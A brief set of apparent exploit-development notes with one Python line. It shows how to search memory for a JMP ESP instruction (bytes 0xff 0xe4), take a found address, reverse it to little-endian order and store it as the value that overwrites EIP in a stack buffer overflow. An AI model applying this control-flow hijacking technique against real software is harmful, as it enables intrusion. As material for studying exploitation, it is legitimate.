  #find <startaddr>,<endaddr>,0xff,0xe4
  #fist hex after the heap
  #last hex (before the stack)
  #0xff 0xe4 = JMP ESP
#take first six and go to script
#alter the eip variable using little indian of one of the hex values taken
#0xf7f65aff
#f7 f6 5a ff
#ff 5a f6 f7
eip = "\xff\x5a\xf6\xf7"
